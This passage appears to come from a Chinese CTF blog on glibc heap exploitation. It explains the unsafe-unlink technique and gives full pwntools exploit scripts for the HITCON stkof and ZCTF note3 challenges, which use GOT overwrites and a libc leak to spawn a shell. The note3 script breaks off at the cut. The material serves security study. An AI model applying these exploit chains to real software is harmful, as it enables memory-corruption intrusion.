string">"We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>chunk1_hdr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;=</span> <span class="token operator">~</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>chunk1_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span> victim_string<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>victim_string<span class="token punctuation">,</span><span class="token string">"Hello!~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>chunk0_ptr<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span> victim_string<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Original value: %s\n"</span><span class="token punctuation">,</span>victim_string<span class="token punctuation">)</span><span class="token punctuation">;</span>chunk0_ptr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x4141414142424242LL</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"New Value: %s\n"</span><span class="token punctuation">,</span>victim_string<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// sanity check</span><span class="token function">assert</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span>victim_string <span class="token operator">==</span> <span class="token number">0x4141414142424242L</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单来说就是在一个chunk中伪造一个被free的chunk头，并修改下一个chunk的prev_inuse位，之后free下一次chunk触发向上unlink</p><p>具体的伪造为：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">PREV_SIZE <span class="token operator">=</span> <span class="token number">0x0</span>SIZE <span class="token operator">=</span> p_size <span class="token operator">-</span> <span class="token number">0x10</span><span class="token comment">#   64位</span>FD <span class="token operator">=</span> p_addr <span class="token operator">-</span> <span class="token number">0x18</span>BK <span class="token operator">=</span> p_addr <span class="token operator">-</span> ox10<span class="token comment">#   32位</span><span class="token comment"># FD = p_addr - 12</span><span class="token comment"># BK = p_addr - 8</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同时修改下一个物理相邻的 chunk 的</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">prev_inuse <span class="token operator">=</span> <span class="token number">0</span> prev_size <span class="token operator">=</span> p_size <span class="token operator">-</span> <span class="token number">0x10</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>之后再free下一个chunk，最终使得在 p 处写入 &amp;p - 0x18</p><p>注意：在ubunut16即libc-2.23中仍然可以使用该技巧，只是需要两个chunk合并之后的大小<strong>足以放入unsortbins中即可</strong></p><p>这里我找了两个例题巩固一下：</p><h3 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a>2014 HITCON stkof</h3><p>这题太经典了，简直是学习unlink必做的题QAQ</p><h4 id="checksec："><a href="#checksec：" class="headerlink" title="checksec："></a><strong>checksec：</strong></h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/mark/Desktop/stkof/stkof'</span>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有开启PIE且got表可修改，考虑使用unlink利用来修改got表</p><h4 id="主要逻辑："><a href="#主要逻辑：" class="headerlink" title="主要逻辑："></a><strong>主要逻辑：</strong></h4><p><img src="https://pic.imgdb.cn/item/61161f575132923bf8d74cf1.jpg"></p><h4 id="漏洞："><a href="#漏洞：" class="headerlink" title="漏洞："></a><strong>漏洞：</strong></h4><p>在edit函数中，存在off by one漏洞，可溢出一个字节</p><p><img src="https://pic.imgdb.cn/item/61161fa75132923bf8d7ed88.jpg"></p><h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a><strong>利用思路</strong></h4><p>首先利用off by one漏洞触发伪造的unlink实现全局任意地址写</p><p>更具unlink的利用方式，在NO PIE的情况下可直接获得bss段上放置chunk地址指针的地址p</p><p>之后构造 FD = p - 0x18 ; BK = p - 0x10 来触发unlink</p><p>在这题我们构造</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token comment"># idx = 1</span>add<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token comment"># idx = 2 </span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token comment"># idx = 3</span>add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token comment"># idx = 4</span><span class="token comment"># Chunk_2 and chunk_3 are physically opposed</span><span class="token comment"># SIZE = 0X91</span>fd <span class="token operator">=</span> <span class="token number">0x602150</span> <span class="token operator">-</span> <span class="token number">0x18</span>bk <span class="token operator">=</span> <span class="token number">0x602150</span> <span class="token operator">-</span> <span class="token number">0x10</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bk<span class="token punctuation">)</span> <span class="token comment">#32</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x39</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment"># trigger unlink</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后便能得到</p><p><img src="https://pic.imgdb.cn/item/611630605132923bf8fa762e.jpg"></p><p>即使bss段上原来指向heap区的指针指向了bss段，实现了任意写的结果</p><p>即现在开始编辑 chunk_2 即可修改从0x602138开始的bss段上区域</p><p>之后我们修改0x602140（chunk_0）为puts的got表，修改0x602148（chunk_1）为free的got表</p><p>之后修改chunk_1（free的got表）为puts的plt表，即可做到 free@got ==&gt; puts@plt</p><p><img src="https://pic.imgdb.cn/item/611638205132923bf808cb95.jpg"></p><p>之后调用free(0)即可泄露puts的真实地址，计算libc基址后再次修改free的plt指向system,之后再chunk_4 中写入<code>/bin/sh\x00</code></p><p>调用free(4)即可getshell</p><p><img src="https://pic.imgdb.cn/item/611638bf5132923bf809e4fa.jpg"></p><h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a><strong>完整exp</strong></h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>elf_name <span class="token operator">=</span> <span class="token string">"stkof"</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span>local <span class="token operator">=</span> <span class="token number">1</span>debug <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./'</span><span class="token operator">+</span>elf_name<span class="token punctuation">)</span><span class="token keyword">if</span> local<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./"</span> <span class="token operator">+</span> elf_name<span class="token punctuation">)</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token keyword">def</span> <span class="token function">choice</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>size<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    choice<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    choice<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token comment"># idx = 1</span>    add<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token comment"># idx = 2 </span>    add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token comment"># idx = 3</span>    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token comment"># idx = 4</span>    <span class="token comment"># Chunk_2 and chunk_3 are physically opposed</span>    <span class="token comment"># SIZE = 0X91</span>    p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    fd <span class="token operator">=</span> <span class="token number">0x602150</span> <span class="token operator">-</span> <span class="token number">0x18</span>    bk <span class="token operator">=</span> <span class="token number">0x602150</span> <span class="token operator">-</span> <span class="token number">0x10</span>    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bk<span class="token punctuation">)</span>     payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"Edit_size ==> "</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x39</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span> <span class="token comment"># free@got ==> puts@plt</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span> <span class="token number">8</span> <span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># gdb.attach(p)</span>    <span class="token comment"># pause()</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"put_addr :"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc_base :"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span> <span class="token comment"># free@got ==> system</span>    edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    <span class="token comment"># gdb.attach(p)</span>    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>调完真的使长舒一口气啊~</p><p>很久之前就看过unlink的介绍，但是一直没做到过unlink相关的题目，理论知识max但是遇到问题了还是很头疼，系统的过一遍how2heap果然很必要QWQ</p><h3 id="ZCTF-2016-note3"><a href="#ZCTF-2016-note3" class="headerlink" title="ZCTF 2016 note3"></a>ZCTF 2016 note3</h3><p>看了半天ida的分析都没太看懂，果然遇事不决还是gdb跑几遍会比较清楚QAQ</p><h4 id="checksec：-1"><a href="#checksec：-1" class="headerlink" title="checksec："></a>checksec：</h4><p>仍然是可修改GOT表和未开启PIE，在ctfWiki上列出了两个问题其实我自己只找个一个，还是没啥用的那个（</p><p>首先是free掉一个note之后在bss段上的size数据没有及时删除，其次还有一个整除溢出的较严重的问题，下面详细分析一下：</p><h4 id="主要逻辑：-1"><a href="#主要逻辑：-1" class="headerlink" title="主要逻辑："></a>主要逻辑：</h4><p>题目总体就是常规的菜单选择：</p><p><img src="https://pic.imgdb.cn/item/6117d8795132923bf877f17f.jpg"></p><h4 id="漏洞：-1"><a href="#漏洞：-1" class="headerlink" title="漏洞："></a>漏洞：</h4><p>其中New note的主要逻辑如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">read_1</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>ptr<span class="token punctuation">,</span> size<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>CHUNK<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> ptr<span class="token punctuation">;</span>SIZE<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> size<span class="token punctuation">;</span>SIZE<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>CHUNK<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>其中SIZE和CHUNK都在bss段上，其中创建chunk最主要的函数就是read_1:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">read_1</span><span class="token punctuation">(</span>__int64 ptr<span class="token punctuation">,</span> __int64 size<span class="token punctuation">,</span> <span class="token keyword">char</span> over_char<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> over<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-34h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment">// [rsp+2Fh] [rbp-11h]</span>  <span class="token keyword">unsigned</span> __int64 i<span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-10h]</span>  <span class="token class-name">ssize_t</span> v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+38h] [rbp-8h]</span>  over <span class="token operator">=</span> over_char<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span> size <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">></span> i<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v7 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> buf <span class="token operator">==</span> over <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> ptr<span class="token punctuation">)</span> <span class="token operator">=</span> buf<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>ptr <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> i<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这里有个常见的整数溢出问题，在for循环中的判断条件是：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">size <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">></span> i<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>条件中 size 是<code>__int64 size</code> ,但是 i 却是<code>unsigned __int64 i</code></p><p><strong>如果size == 0，则size - 1 ==  -1 ，但在和 i 比较的时候却会被 i 认为是 unsigned __int64最大整数，</strong>此时就可以无限制输入。</p><p>所以出题人才会在这个函数中设置 over_char 这个参数，以便于对这个输入做出结束。</p><p>即这题可以利用整数溢出来构造堆溢出来控制堆块内容</p><h4 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h4><p>可以堆溢出我的第一反应其实还是伪造fastbin的fd来构造fastbinAttack来打，但是既然是在学unlink就尝试用这个手段试试</p><p>首先malloc一些堆块用于接下来的利用：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">"0000"</span><span class="token punctuation">)</span> <span class="token comment"># idx = 0</span>add<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">"1111"</span><span class="token punctuation">)</span> <span class="token comment"># idx = 1</span>add<span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token string">"2222"</span><span class="token punctuation">)</span> <span class="token comment"># idx = 2</span>add<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">"3333"</span><span class="token punctuation">)</span> <span class="token comment"># idx = 3</span>add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token string">"4444"</span><span class="token punctuation">)</span> <span class="token comment"># idx = 4</span>add<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">"5555"</span><span class="token punctuation">)</span> <span class="token comment"># idx = 5</span>add<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span> <span class="token comment"># idx = 6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的idx = 2的堆块就是size == 0 的可以无线输入的堆块，之后只要修改 idx = 2 的内容，使idx = 3 和 idx = 4发生我们伪造的unlink</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">ptr <span class="token operator">=</span> <span class="token number">0x6020e0</span>   fd <span class="token operator">=</span> ptr <span class="token operator">-</span> <span class="token number">0x18</span>   bk <span class="token operator">=</span> ptr <span class="token operator">-</span> <span class="token number">0x10</span>   <span class="token comment"># gdb.attach(p)</span>   payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">1111</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span>   payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bk<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>   payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span>   edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>   free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment"># unlink</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>触发unlink之后看一下bss段上的数据：</p><p><img src="https://pic.imgdb.cn/item/611803935132923bf81e1af8.jpg"></p><p>即我们在bss段上放入了一个bss段上的地址（把chunk idx  = 3的地址改为了chunk 0 所在的地址）</p><p>之后只要修改chunk0和chunk1分别为 elf.got[‘free’] 和 elf.got[‘atoi’] ，便将可他们的got地址作为chunk idx可以获得的地址</p><p>之后在修改free的got为puts的plt泄露真实地址然后在修改free到system,最后free一个sh即可getshll</p><p><img src="C:\Users\sunjiajun\AppData\Roaming\Typora\typora-user-images\image-20210815021016288.png" alt="image-20210815021016288"></p><h4 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp"></a>完整exp</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>elf_name <span class="token operator">=</span> <span class="token string">"note3"</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>ip <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span>port <span class="token operator">=</span> <span class="token number">9997</span>local <span class="token operator">=</span> <span class="token number">1</span>debug <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./'</span><span class="token 